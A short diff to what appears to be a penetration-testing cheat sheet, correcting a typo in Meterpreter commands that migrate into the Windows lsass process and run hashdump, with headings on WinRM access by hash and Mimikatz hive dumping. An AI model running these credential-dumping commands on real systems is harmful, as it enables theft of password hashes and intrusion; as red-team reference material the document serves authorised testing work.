@@ -46,7 +46,7 @@ Access port 5985. Use with a username / password or username / hash.
 ### Metasploit and Meterpreter   
 Meterpreter shell: need to migrate to lsass process to dump hashes, due to process permissions on Windows.         
     
-    meter > migrate -N lsasse.exe       
+    meter > migrate -N lsass.exe       
     meter > hashdump     
     
 ### Dump Hives and Extract with Mimikatz     
